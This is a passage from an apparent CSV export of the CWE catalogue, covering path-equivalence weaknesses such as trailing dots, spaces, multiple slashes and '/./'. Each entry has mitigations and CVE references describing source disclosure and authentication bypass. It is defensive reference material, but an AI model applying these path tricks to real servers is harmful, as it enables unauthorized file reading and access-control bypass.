%20:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1603::REFERENCE:CVE-2001-0054:DESCRIPTION:Multi-Factor Vulnerability (MFV). directory traversal and other issues in FTP server using Web encodings such as %20; certain manipulations have unusual side effects.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0054::REFERENCE:CVE-2002-1451:DESCRIPTION:Trailing space (+ in query string) leads to source code disclosure.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1451::REFERENCE:CVE-2000-0293:DESCRIPTION:Filenames with spaces allow arbitrary file deletion when the product does not properly quote them; some overlap with path traversal.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0293::REFERENCE:CVE-2001-1567:DESCRIPTION:+ characters in query string converted to spaces before sensitive file/extension (internal space), leading to bypass of access restrictions to the file.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1567::REFERENCE:CVE-2002-0253:DESCRIPTION:Overlaps infoleak:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0253::REFERENCE:CVE-2001-0446:DESCRIPTION:Application server allows remote attackers to read source code for .jsp files by appending a / to the requested URL.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0446::REFERENCE:CVE-2004-0334:DESCRIPTION:Bypass Basic Authentication for files using trailing /:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0334::REFERENCE:CVE-2001-0893:DESCRIPTION:Read sensitive files with trailing /:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0893::REFERENCE:CVE-2001-0892:DESCRIPTION:Web server allows remote attackers to view sensitive files under the document root (such as .htpasswd) via a GET request with a trailing /.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0892::REFERENCE:CVE-2004-1814:DESCRIPTION:Directory traversal vulnerability in server allows remote attackers to read protected files via .. (dot dot) sequences in an HTTP request.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1814::REFERENCE:CVE-2002-1483:DESCRIPTION:Read files with full pathname using multiple internal slash.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1483::REFERENCE:CVE-1999-1456:DESCRIPTION:Server allows remote attackers to read arbitrary files via a GET request with more than one leading / (slash) character in the filename.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-1456::REFERENCE:CVE-2004-0578:DESCRIPTION:Server allows remote attackers to read arbitrary files via leading slash (//) characters in a URL request.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0578::REFERENCE:CVE-2002-0275:DESCRIPTION:Server allows remote attackers to bypass authentication and read restricted files via an extra / (slash) in the requested URL.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0275::REFERENCE:CVE-2004-1032:DESCRIPTION:Product allows local users to delete arbitrary files or create arbitrary empty files via a target filename with a large number of leading slash (/) characters.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1032::REFERENCE:CVE-2002-1238:DESCRIPTION:Server allows remote attackers to bypass access restrictions for files via an HTTP request with a sequence of multiple / (slash) characters such as http://www.example.com///file/.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1238::REFERENCE:CVE-2004-1878:DESCRIPTION:Product allows remote attackers to bypass authentication, obtain sensitive information, or gain access via a direct request to admin/user.pl preceded by // (double leading slash).:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1878::REFERENCE:CVE-2005-1365:DESCRIPTION:Server allows remote attackers to execute arbitrary commands via a URL with multiple leading / (slash) characters and .. sequences.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1365::REFERENCE:CVE-2000-1050:DESCRIPTION:Access directory using multiple leading slash.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-1050::REFERENCE:CVE-2001-1072:DESCRIPTION:Bypass access restrictions via multiple leading slash, which causes a regular expression to fail.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1072::REFERENCE:CVE-2004-0235:DESCRIPTION:Archive extracts to arbitrary files using multiple leading slash in filenames in the archive.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0235::REFERENCE:CVE-2002-1078:DESCRIPTION:Directory listings in web server using multiple trailing slash:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1078::REFERENCE:CVE-2004-0847:DESCRIPTION:ASP.NET allows remote attackers to bypass authentication for .aspx files in restricted directories via a request containing a (1) (backslash) or (2) %5C (encoded backslash), aka Path Validation Vulnerability.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0847::REFERENCE:CVE-2000-0004:DESCRIPTION:Server allows remote attackers to read source code for executable files by inserting a . (dot) into the URL.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0004::REFERENCE:CVE-2002-0304:DESCRIPTION:Server allows remote attackers to read password-protected files via a /./ in the HTTP request.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0304::REFERENCE:CVE-1999-1083:DESCRIPTION:Possibly (could be a cleansing error):LINK:https://www.cve.org/CVERecord?id=CVE-1999-1083::REFERENCE:CVE-2004-0815:DESCRIPTION:/./////etc cleansed to .///etc then /etc:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0815::REFERENCE:CVE-2002-0112:DESCRIPTION:Server allows remote attackers to view password protected files via /./ in the URL.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0112::REFERENCE:CVE-2004-0696:DESCRIPTION:List directories using desired path and *:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0696::REFERENCE:CVE-2002-0433:DESCRIPTION:List files in web server using *.ext:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0433::REFERENCE:CVE-2001-1152:DESCRIPTION:Proxy allows remote attackers to bypass denylist restrictions and connect to unauthorized web servers by modifying the requested URL, including (1) a // (double slash), (2) a /SUBDIR/.. where the desired file is in the parentdir, (3) a /./, or (4) URL-encoded characters.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1152::REFERENCE:CVE-2000-0191:DESCRIPTION:application check access for restricted URL before canonicalization:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0191::REFERENCE:CVE-2005-1366:DESCRIPTION:CGI source disclosure using dirname/../cgi-bin:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1366::REFERENCE:CVE-1999-0012:DESCRIPTION:Multiple web servers allow restriction bypass using 8.3 names instead of long names:LINK:https://www.cve.org/CVERecord?id=CVE-1999-0012::REFERENCE:CVE-2001-0795:DESCRIPTION:Source code disclosure using 8.3 file name.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0795::REFERENCE:CVE-2005-0471:DESCRIPTION:Multi-Factor Vulnerability. Product generates temporary filenames using long filenames, which become predictable in 8.3 format.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0471::\",,::File or Directory::,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Path Equivalence::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:FIO02-C:ENTRY NAME:Canonicalize path names originating from untrusted sources::\",::3::,\"::TYPE:Relationship:NOTE:Some of these manipulations could be effective in path traversal issues, too.::\",\n42,\"Path Equivalence: 'filename.' (Trailing Dot)\",Variant,Incomplete,\"The product accepts path input in the form of trailing dot ('filedir.') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.\",\"\",::NATURE:ChildOf:CWE ID:41:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:162:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism::\",\"\",\"\",\"::REFERENCE:CVE-2000-1114:DESCRIPTION:Source code disclosure using trailing dot:LINK:https://www.cve.org/CVERecord?id=CVE-2000-1114::REFERENCE:CVE-2002-1986:DESCRIPTION:Source code disclosure using trailing dot:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1986::REFERENCE:CVE-2004-2213:DESCRIPTION:Source code disclosure using trailing dot:LINK:https://www.cve.org/CVERecord?id=CVE-2004-2213::REFERENCE:CVE-2005-3293:DESCRIPTION:Source code disclosure using trailing dot:LINK:https://www.cve.org/CVERecord?id=CVE-2005-3293::REFERENCE:CVE-2004-0061:DESCRIPTION:Bypass directory access restrictions using trailing dot in URL:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0061::REFERENCE:CVE-2000-1133:DESCRIPTION:Bypass directory access restrictions using trailing dot in URL:LINK:https://www.cve.org/CVERecord?id=CVE-2000-1133::REFERENCE:CVE-2001-1386:DESCRIPTION:Bypass check for .lnk extension using .lnk.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1386::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Trailing Dot - 'filedir.'::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP16:ENTRY NAME:Path Traversal::\",,\"\",\n43,\"Path Equivalence: 'filename....' (Multiple Trailing Dot)\",Variant,Incomplete,\"The product accepts path input in the form of multiple trailing dot ('filedir....') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.\",\"\",::NATURE:ChildOf:CWE ID:42:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:163:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories::\",\"\",\"\",\"::REFERENCE:CVE-2004-0281:DESCRIPTION:Multiple trailing dot allows directory listing:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0281::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Multiple Trailing Dot - 'filedir....'::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP16:ENTRY NAME:Path Traversal::\",,\"\",\n44,\"Path Equivalence: 'file.name' (Internal Dot)\",Variant,Incomplete,\"The product accepts path input in the form of internal dot ('file.ordir') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.\",\"\",::NATURE:ChildOf:CWE ID:41:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Internal Dot - 'file.ordir'::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP16:ENTRY NAME:Path Traversal::\",,\"::TYPE:Relationship:NOTE:An improper attempt to remove the internal dots from the string could lead to CWE-181 (Incorrect Behavior Order: Validate Before Filter).::\",\n45,\"Path Equivalence: 'file...name' (Multiple Internal Dot)\",Variant,Incomplete,\"The product accepts path input in the form of multiple internal dot ('file...dir') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.\",\"\",::NATURE:ChildOf:CWE ID:44:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:165:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Multiple Internal Dot - 'file...dir'::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP16:ENTRY NAME:Path Traversal::\",,\"::TYPE:Relationship:NOTE:An improper attempt to remove the internal dots from the string could lead to CWE-181 (Incorrect Behavior Order: Validate Before Filter).::\",\n46,\"Path Equivalence: 'filename ' (Trailing Space)\",Variant,Incomplete,\"The product accepts path input in the form of trailing space ('filedir ') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.\",\"\",::NATURE:ChildOf:CWE ID:41:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:162:VIEW ID:1000::NATURE:CanPrecede:CWE ID:289:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories::\",\"\",\"\",\"::REFERENCE:CVE-2001-0693:DESCRIPTION:Source disclosure via trailing encoded space %20:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0693::REFERENCE:CVE-2001-0778:DESCRIPTION:Source disclosure via trailing encoded space %20:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0778::REFERENCE:CVE-2001-1248:DESCRIPTION:Source disclosure via trailing encoded space %20:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1248::REFERENCE:CVE-2004-0280:DESCRIPTION:Source disclosure via trailing encoded space %20:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0280::REFERENCE:CVE-2004-2213:DESCRIPTION:Source disclosure via trailing encoded space %20:LINK:https://www.cve.org/CVERecord?id=CVE-2004-2213::REFERENCE:CVE-2005-0622:DESCRIPTION:Source disclosure via trailing encoded space %20:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0622::REFERENCE:CVE-2005-1656:DESCRIPTION:Source disclosure via trailing encoded space %20:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1656::REFERENCE:CVE-2002-1603:DESCRIPTION:Source disclosure via trailing encoded space %20:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1603::REFERENCE:CVE-2001-0054:DESCRIPTION:Multi-Factor Vulnerability (MFV). directory traversal and other issues in FTP server using Web encodings such as %20; certain manipulations have unusual side effects.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0054::REFERENCE:CVE-2002-1451:DESCRIPTION:Trailing space (+ in query string) leads to source code disclosure.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1451::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Trailing Space - 'filedir '::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP16:ENTRY NAME:Path Traversal::\",::649::,\"\",\n47,\"Path Equivalence: ' filename' (Leading Space)\",Variant,Incomplete,\"The product accepts path input in the form of leading space (' filedir') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.\",\"\",::NATURE:ChildOf:CWE ID:41:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Leading Space - ' filedir'::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP16:ENTRY NAME:Path Traversal::\",,\"\",\n48,\"Path Equivalence: 'file name' (Internal Whitespace)\",Variant,Incomplete,\"The product accepts path input in the form of internal space ('file(SPACE)name') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.\",\"\",::NATURE:ChildOf:CWE ID:41:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories::\",\"\",\"\",\"::REFERENCE:CVE-2000-0293:DESCRIPTION:Filenames with spaces allow arbitrary file deletion when the product does not properly quote them; some overlap with path traversal.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0293::REFERENCE:CVE-2001-1567:DESCRIPTION:+ characters in query string converted to spaces before sensitive file/extension (internal space), leading to bypass of access restrictions to the file.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1567::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:file(SPACE)name (internal space)::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A9:ENTRY NAME:Denial of Service:MAPPING FIT:CWE More Specific::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP16:ENTRY NAME:Path Traversal::\",,\"::TYPE:Relationship:NOTE:This weakness is likely to overlap quoting problems, e.g. the Program Files unquoted search path (CWE-428). It also could be an equivalence issue if filtering removes all extraneous spaces.::TYPE:Relationship:NOTE:Whitespace can be a factor in other weaknesses not directly related to equivalence. It can also be used to spoof icons or hide files with dangerous names (see icon manipulation and visual truncation in CWE-451).::\",\n49,\"Path Equivalence: 'filename/' (Trailing Slash)\",Variant,Incomplete,\"The product accepts path input in the form of trailing slash ('filedir/') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.\",\"\",::NATURE:ChildOf:CWE ID:41:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:162:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::PHASE:Operation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories::\",\"\",\"\",\"::REFERENCE:CVE-2002-0253:DESCRIPTION:Overlaps infoleak:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0253::REFERENCE:CVE-2001-0446:DESCRIPTION:Application server allows remote attackers to read source code for .jsp files by appending a / to the requested URL.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0446::REFERENCE:CVE-2004-0334:DESCRIPTION:Bypass Basic Authentication for files using trailing /:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0334::REFERENCE:CVE-2001-0893:DESCRIPTION:Read sensitive files with trailing /:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0893::REFERENCE:CVE-2001-0892:DESCRIPTION:Web server allows remote attackers to view sensitive files under the document root (such as .htpasswd) via a GET request with a trailing /.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0892::REFERENCE:CVE-2004-1814:DESCRIPTION:Directory traversal vulnerability in server allows remote attackers to read protected files via .. (dot dot) sequences in an HTTP request.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1814::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:filedir/ (trailing slash, trailing /)::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP16:ENTRY NAME:Path Traversal::\",,\"\",\n50,\"Path Equivalence: '//multiple/leading/slash'\",Variant,Incomplete,\"The product accepts path input in the form of multiple leading slash ('//multiple/leading/slash') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.\",\"\",::NATURE:ChildOf:CWE ID:41:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:161:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories::\",\"\",\"\",\"::REFERENCE:CVE-2002-1483:DESCRIPTION:Read files with full pathname using multiple internal slash.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1483::REFERENCE:CVE-1999-1456:DESCRIPTION:Server allows remote attackers to read arbitrary files via a GET request with more than one leading / (slash) character in the filename.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-1456::REFERENCE:CVE-2004-0578:DESCRIPTION:Server allows remote attackers to read arbitrary files via leading slash (//) characters in a URL request.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0578::REFERENCE:CVE-2002-0275:DESCRIPTION:Server allows remote attackers to bypass authentication and read restricted files via an extra / (slash) in the requested URL.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0275::REFERENCE:CVE-2004-1032:DESCRIPTION:Product allows local users to delete arbitrary files or create arbitrary empty files via a target filename with a large number of leading slash (/) characters.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1032::REFERENCE:CVE-2002-1238:DESCRIPTION:Server allows remote attackers to bypass access restrictions for files via an HTTP request with a sequence of multiple / (slash) characters such as http://www.example.com///file/.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1238::REFERENCE:CVE-2004-1878:DESCRIPTION:Product allows remote attackers to bypass authentication, obtain sensitive information, or gain access via a direct request to admin/user.pl preceded by // (double leading slash).:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1878::REFERENCE:CVE-2005-1365:DESCRIPTION:Server allows remote attackers to execute arbitrary commands via a URL with multiple leading / (slash) characters and .. sequences.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1365::REFERENCE:CVE-2000-1050:DESCRIPTION:Access directory using multiple leading slash.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-1050::REFERENCE:CVE-2001-1072:DESCRIPTION:Bypass access restrictions via multiple leading slash, which causes a regular expression to fail.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1072::REFERENCE:CVE-2004-0235:DESCRIPTION:Archive extracts to arbitrary files using multiple leading slash in filenames in the archive.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0235::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME://multiple/leading/slash ('multiple leading slash')::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP16:ENTRY NAME:Path Traversal::\",,\"\",\n51,\"Path Equivalence: '/multiple//internal/slash'\",Variant,Incomplete,\"The product accepts path input in the form of multiple internal slash ('/multiple//internal/slash/') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.\",\"\",::NATURE:ChildOf:CWE ID:41:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories::\",\"\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::\",\"::REFERENCE:CVE-2002-1483:DESCRIPTION:Read files with full pathname using multiple internal slash.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1483::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:/multiple//internal/slash ('multiple internal slash')::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP16:ENTRY NAME:Path Traversal::\",,\"\",\n52,\"Path Equivalence: '/multiple/trailing/slash//'\",Variant,Incomplete,\"The product accepts path input in the form of multiple trailing slash ('/multiple/trailing/slash//') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.\",\"\",::NATURE:ChildOf:CWE ID:41:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:163:VIEW ID:1000::NATURE:CanPrecede:CWE ID:289:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories::\",\"\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::\",\"::REFERENCE:CVE-2002-1078:DESCRIPTION:Directory listings in web server using multiple trailing slash:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1078::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:/multiple/trailing/slash// ('multiple trailing slash')::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP16:ENTRY NAME:Path Traversal::\",,\"\",\n53,\"Path Equivalence: 'multipleinternalbackslash'\",Variant,Incomplete,\"The product accepts path input in the form of multiple internal backslash ('multipletrailingslash') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.\",\"\",::NATURE:ChildOf:CWE ID:41:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:165:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories::\",\"\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::\",\"\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:multipleinternalbackslash::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP16:ENTRY NAME:Path Traversal::\",,\"\",\n54,\"Path Equivalence: 'filedir' (Trailing Backslash)\",Variant,Incomplete,\"The product accepts path input in the form of trailing backslash ('filedir') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.\",\"\",::NATURE:ChildOf:CWE ID:41:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:162:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories::\",\"\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::\",\"::REFERENCE:CVE-2004-0847:DESCRIPTION:web framework for .NET allows remote attackers to bypass authentication for .aspx files in restricted directories via a request containing a (1) (backslash) or (2) %5C (encoded backslash):LINK:https://www.cve.org/CVERecord?id=CVE-2004-0847::REFERENCE:CVE-2004-0061:DESCRIPTION:Bypass directory access restrictions using trailing dot in URL:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0061::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:filedir (trailing backslash)::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP16:ENTRY NAME:Path Traversal::\",,\"\",\n55,\"Path Equivalence: '/./' (Single Dot Directory)\",Variant,Incomplete,\"The product accepts path input in the form of single dot directory exploit ('/./') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.\",\"\",::NATURE:ChildOf:CWE ID:41:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories::\",\"\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::\",\"::REFERENCE:CVE-2000-0004:DESCRIPTION:Server allows remote attackers to read source code for executable files by inserting a . (dot) into the URL.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0004::REFERENCE:CVE-2002-0304:DESCRIPTION:Server allows remote attackers to read password-protected files via a /./ in the HTTP request.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0304::REFERENCE:CVE-1999-1083:DESCRIPTION:Possibly (could be a cleansing error):LINK:https://www.cve.org/CVERecord?id=CVE-1999-1083::REFERENCE:CVE-2004-0815:DESCRIPTION:/./////etc cleansed to .///etc then /etc:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0815::REFERENCE:CVE-2002-0112:DESCRIPTION:Server allows remote attackers to view password protected files via /./ in the URL.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0112::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:/./ (single dot directory)::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP16:ENTRY NAME:Path Traversal::\",,\"\",\n56,\"Path Equivalence: 'filedir*' (Wildcard)\",Variant,Incomplete,\"The product accepts path input in the form of asterisk wildcard ('filedir*') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.\",\"\",::NATURE:ChildOf:CWE ID:41:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:155:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories::\",\"\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been 